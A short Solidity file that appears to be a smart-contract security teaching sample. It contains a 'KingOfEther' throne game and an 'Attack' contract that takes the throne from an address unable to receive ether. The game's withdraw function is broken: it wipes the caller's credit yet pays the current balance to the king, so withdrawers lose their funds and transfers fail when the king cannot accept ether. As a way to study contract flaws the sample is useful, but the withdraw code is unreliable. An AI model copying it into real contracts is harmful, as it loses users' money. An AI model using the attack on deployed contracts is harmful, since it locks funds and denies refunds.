//SPDX-License-Identifier: UNLICENSED

pragma solidity 0.6.11;

contract KingOfEther {
    address public king;
    uint public balance;
    mapping(address => uint) withdrawal;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");
        withdrawal[msg.sender] += msg.value;
        
        balance = msg.value;
        king = msg.sender;
    }
    
    function withdraw() external {
        require(msg.sender != king);
         require(withdrawal[msg.sender] > 0);
         withdrawal[msg.sender] = 0;
        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    KingOfEther kingOfEther;
    constructor(KingOfEther _kingOfEther) public {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}